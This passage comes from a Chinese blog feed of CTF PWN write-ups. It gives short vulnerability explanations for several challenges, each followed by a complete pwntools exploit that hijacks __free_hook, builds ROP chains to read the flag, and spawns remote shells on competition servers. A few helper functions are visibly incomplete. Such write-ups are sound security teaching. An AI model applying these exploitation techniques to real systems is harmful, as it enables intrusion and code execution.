class="number">5</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x50</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">gift(<span class="string">'111'</span>)</span><br><span class="line">gift(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h3><p>开启了seccomp保护，禁止exec系统调用。</p><p>漏洞点跟上一题一样，edit大小为0的时候，会将堆块free掉，但是不会清空指针，可以UAF。</p><p>首先用unsortbin进行leak libc地址。</p><p>接着leak出heap地址。</p><p>在堆中构造出假堆头，修改free的堆块fd指向该假堆块，利用其修改name指针地址为<code>__free_hook</code>。</p><p>接着将<code>__free_hook</code>修改为setcontext，并在堆上写好相应的寄存器值以及rop串即可获取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">"122.112.231.25"</span>,<span class="string">"8005"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,name,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Name of Staff:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number of Staff:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Input len of Info:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"get Info:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span><span class="params">(num,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Choice: 1.Edit Name 2.Edit Info\n &gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span><span class="params">(num,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Choice: 1.Edit Name 2.Edit Info\n &gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input len of Info:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Input info:"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info2</span><span class="params">(num,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Choice: 1.Edit Name 2.Edit Info\n &gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input len of Info:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Input info:"</span>)</span><br><span class="line">p.send(info)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input staff number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number of Staff:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one =[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Input String1:"</span>)</span><br><span class="line">p.sendline(<span class="string">"\x02\x01\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input String2:"</span>)</span><br><span class="line">p.sendline(<span class="string">"\x01\x26"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>,<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3C4C68</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x10000000</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000021112</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x00000000000202f8</span> + libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000003a738</span> + libc.address</span><br><span class="line">pop_rsp = <span class="number">0x0000000000003838</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x0000000000101597</span> + libc.address</span><br><span class="line">ret = <span class="number">0x1015B2</span> + libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'a'</span>,<span class="number">0x58</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">edit_info(<span class="number">4</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'\x90'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x58</span>+<span class="string">'\x71'</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Info:'</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x590</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap+<span class="number">0x918</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>+<span class="number">0x8b8</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>+<span class="number">0x8b8</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">'./flag\x00'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#add(1,'a',0x68,'\x00'*0xb+p64(libc.sym['setcontext'])+p64(0))</span></span><br><span class="line">add(<span class="number">8</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">9</span>,<span class="string">'a'</span>,<span class="number">0xf8</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">'\x00'</span>,<span class="number">0xf8</span>,<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(heap+<span class="number">0x840</span>)+p64(ret)+<span class="string">'\x00'</span>*<span class="number">0x30</span>+p64(heap+<span class="number">0x7b0</span>))</span><br><span class="line">edit_name(<span class="number">6</span>,p64(libc.sym[<span class="string">'setcontext'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x183B)\n b free')</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easyKooc&quot;&gt;&lt;a href=&quot;#easyKooc&quot; class=&quot;headerlink&quot; title=&quot;easyKooc&quot;&gt;&lt;/a&gt;easyKooc&lt;/h3&gt;&lt;p&gt;简单的mips题目，静态地址，存在UAF漏洞，并且有RWX段，可执行shellcode。&lt;/
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/07/dfb841e2/"/>
    <id>https://nuoye-blog.github.io/2020/11/07/dfb841e2/</id>
    <published>2020-11-07T12:00:00.000Z</published>
    <updated>2020-11-10T08:09:29.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="noteplus"><a href="#noteplus" class="headerlink" title="noteplus"></a>noteplus</h3><p>漏洞点在于edit的时候如果size是小于8的话循环退出的判断永远为真，因此可以进行堆溢出。<img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201107183649.png" alt="image-20201106171741833"></p><p>首先填满tcache，利用unsortbin进行leak操作，然后用上面的堆溢出漏洞修改一个free状态的fd到<code>__free_hook</code>，修改其为onegadget地址，即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = process(<span class="string">"./noteplus"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">p = remote(<span class="string">"121.36.245.213"</span>,<span class="string">"23333"</span>)</span><br><span class="line"><span class="comment">#p = process("./noteplus")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x9</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">0x8</span>-i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">2</span>+i,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">add(<span class="number">0x9</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0xb</span>)</span><br><span class="line">free(<span class="number">0xa</span>)</span><br><span class="line">edit(<span class="number">0x9</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\x00'</span>*<span class="number">0x8</span>+p64(<span class="number">0x21</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0xd</span>,p64(libc.address+one[<span class="number">1</span>])+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="youchat"><a href="#youchat" class="headerlink" title="youchat"></a>youchat</h3><p>漏洞点在于password输入的时候存在off by one漏洞，会修改name地址的低位为\x00：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201107183656.png" alt="image-20201106172154888"></p><p>首先填满tcache，利用unsortbin进行leak操作，接着利用上面的漏洞即可在存放name地址之前输入，修改name地址为<code>__free_hook</code>地址，再一次修改name即可劫持<code>__free_hook</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./youchat"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">p = remote(<span class="string">"124.70.158.59"</span>,<span class="string">"30023"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,name,password)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"How long is your user id: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"User name: "</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">p.send(password)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"New username: "</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)<span class="comment">#0 over write</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x9</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>,<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">free(<span class="number">0x8</span>-i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x8</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>,<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'a'</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x12461</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="string">'/bin/sh'</span>,<span class="string">'a'</span>)</span><br><span class="line">free(<span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1876)')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>攻防世界PWN的<a href="https://blog.csdn.net/seaaseesa/article/details/103114909" target="_blank" rel="noopener">echo_back</a>原题。</p><p>首先是leak，然后修改<code>_IO_buf_base</code>的低字节为\x00，接着利用scanf函数覆盖<code>_IO_buf_base</code>和<code>_IO_buf_end</code>成main函数的返回地址的栈地址以及偏移0x18的地址(rop长度为0x18)，接着不断写入换行符使<code>_IO_read_base</code>与<code>_IO_read_end</code>相等，然后再用scanf写入rop即可getshel。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 